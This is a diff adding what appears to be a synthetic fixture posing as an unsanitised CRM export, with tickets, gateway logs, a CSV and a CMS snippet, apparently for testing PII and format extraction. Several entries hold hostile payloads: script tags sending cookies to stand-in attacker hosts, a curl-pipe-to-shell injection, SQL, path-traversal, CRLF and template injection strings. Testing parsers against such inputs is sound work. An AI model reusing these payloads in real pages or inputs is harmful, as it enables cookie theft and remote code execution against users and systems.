@@ -1,0 +1,91 @@
+=========================================================================
+ PARTNER SYNC EXPORT  |  source: crm-gateway-v3 /export/tickets?since=...
+ generated: 2026-03-11T04:15:22Z    encoding: utf-8    records: 41
+ NOTE: payload is UNSANITISED. Upstream vendor does not validate fields.
+=========================================================================
+
+SECTION 1: SUPPORT TICKET DIGEST (free-text, agent-typed)
+
+[TCK-88301] opened 09:14 by Mwiseneza Cyubahiro Clovis <m.clovis@alueducation.com>
+  Learner cannot access the portal. Reset link sent to his personal address
+  cyubahiroclovis69@gmail.com but it bounced. Alt contact on file is
+  +250 791762771 (WhatsApp only, do not call before 08:00).
+  Escalated to  #PortalAccess  at 2:45 PM. Docs: https://support.alueducation.com/kb/article?id=4471&lang=en
+  Follow-up scheduled 14:30. Refund of RWF 45,000 approved by finance.
+
+[TCK-88302] opened 11:02 by  ops.desk@si.alueducation.com
+  Vendor invoice dispute. They billed us $1,299.99 instead of $1,199.00.
+  Contact at vendor: Billing Dept <billing@northgate-systems.co.uk>, tel
+  +44 20 7946 0958 / ext. 214. Backup line (0207) 946 0122.
+  Card on file ending 4242 — full number was pasted into the ticket body by
+  mistake: 4111 1111 1111 1111  (PLEASE PURGE). A second card was typed as
+  4111-1111-1111-1112 which the gateway rejected.
+  Invoice PDF: http://legacy-billing.northgate-systems.co.uk:8080/inv/2026/Q1-0221.pdf?token=a9f3c1
+  Meeting set for 09:00 GMT, our side joins 11:00 AM CAT. #Finance #Q1Close
+
+[TCK-88303] opened 16:47 by Owen Yhaan Ganza (alumni) o.ganza@alumni.alueducation.com
+  Requesting transcript. Old student email o.ganza@alueducation.com is
+  deactivated. Phone: 0788 900 145. Willing to pay the $25 processing fee or
+  $20 equivalent. Prefers pickup 08:30-17:00, closed 12:00–13:00 for lunch.
+  Note from agent: this person also wrote from o.ganza@alumni.alueducation.co
+  — one letter short, treat as UNVERIFIED. #Transcripts
+
+[TCK-88304] opened 23:58 — anonymous web form, NO AUTH
+  Body: "hello i need help');DROP TABLE users;-- my email is
+  attacker@evil.example.com and my number is +250700000000"
+  Agent note: form also contained <script>fetch('https://exfil.evil.example.com/c?d='+document.cookie)</script>
+  and an image payload <img src=x onerror="alert(document.domain)">.
+  Referrer was javascript:void(document.location='https://phish.example.net/login')
+  QUARANTINE. Do not render. #Security #Incident
+
+SECTION 2: RAW GATEWAY LOG LINES
+
+2026-03-10 08:00:04 INFO  auth.login user=k.mugisha@alueducation.com ip=41.74.160.12 ok
+2026-03-10 08:00:59 WARN  auth.login user=k.mugisha@alueducation.com.attacker.net ip=185.220.101.7 DENIED
+2026-03-10 09:15:31 INFO  billing.charge card=5500 0055 5555 5559 amt=USD 240.50 status=captured
+2026-03-10 09:15:33 INFO  billing.charge card=378282246310005 amt=USD 89.99 status=captured
+2026-03-10 09:16:02 ERROR billing.charge card=6011 1111 1111 1117 amt=USD 1,450.00 status=declined
+2026-03-10 09:16:40 ERROR billing.charge card=1234567890123456 amt=USD 10.00 status=invalid_number
+2026-03-10 13:44:12 INFO  webhook.out url=https://hooks.partner-api.io/v2/events/ingest?sig=8f21ab retries=0
+2026-03-10 13:44:12 WARN  webhook.out url=file:///etc/passwd BLOCKED_SCHEME
+2026-03-10 13:44:13 WARN  webhook.out url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== BLOCKED_SCHEME
+2026-03-10 18:05:00 INFO  cron.report window=18:05:00→23:59:59 rows=1204
+2026-03-10 22:10:45 WARN  input.filter payload="{{7*7}}" template_injection_suspected
+2026-03-10 22:10:46 WARN  input.filter payload="$(curl -s https://evil.example.com/x.sh | sh)" cmd_injection_suspected
+2026-03-10 22:10:47 WARN  input.filter payload="../../../../etc/shadow" path_traversal_suspected
+2026-03-10 22:11:01 WARN  input.filter payload="admin@alu.rw%0d%0aBcc:everyone@alueducation.com" crlf_injection_suspected
+
+SECTION 3: MARKETING CSV FRAGMENT
+
+name,email,phone,pledge,slot
+"Mukamana, Divine",divine.m@si.alueducation.com,+250-733-408-291,"RWF 120,000",7:30 AM
+"O'Brien, Sean",sean.obrien@example.org , (415) 555-0147 ,"$2,500.00",1:15 pm
+"Chen, Wei",wei.chen@sub.domain.example.co.jp,+81 3-1234-5678,"¥180,000",09:45
+"Bad Row",not-an-email@,+250 78,"$",25:99
+"Doe, Jane",jane..doe@example.com,+1 (202) 555-0198,"£15.50",11:59 PM
+"Kamanzi, Eric",e.kamanzi@alumni.alueducation.com,0722 145 908,"RWF 8,500",16:20
+
+SECTION 4: SNIPPET FROM THE PARTNER'S CMS
+
+<div class="ticket-card" data-id="88301">
+  <h2 style="color:#FF5733">Escalations — #Q1Close</h2>
+  <p>Contact <a href="mailto:desk@alueducation.com">the desk</a> before 17:00.</p>
+  <span class="badge" style="background:#0d3b66">#Urgent</span>
+  <p>Fee: EUR 42.00 &middot; Alt: 42.00 EUR &middot; legacy: 42,00&nbsp;EUR</p>
+  <iframe src="https://ads.tracker.example.net/pixel?u=k.mugisha@alueducation.com"></iframe>
+  <script>window.location='https://phish.example.net/?s='+btoa(document.cookie)</script>
+  <img src="https://cdn.example.com/logo.png" alt="logo" />
+  <br/>
+</div>
+
+--- SECTION 5: MISC NOTES
+
+* Hex colours used in the brand kit: #FF5733, #0D3B66, #FFF — these are NOT hashtags.
+* HTML entity in a legacy note: &#39;quoted&#39; — also NOT a hashtag.
+* Timezone edge cases seen in the wild: 00:00, 23:59, 24:00 (invalid), 12:00 AM, 12:00 PM, 13:00 PM (invalid).
+* Amounts appear as: $99, $99.9, $99.99, USD 99.99, 99.99 USD, RWF 1,250,000, ¥180,000, £0.99, €1,000.
+* Someone wrote a card as "4111111111111111111111" (22 digits) — must be rejected.
+* Someone wrote a phone as "+250788214663" and elsewhere as "+250 (0)788 214 663".
+* Shortened link in a tweet: https://alu.rw/x9Fq2 #ALUmniNetwork #GraduationDay2026
+* Duplicate of the first ticket email appears again here: mclovis@alueducation.com
+
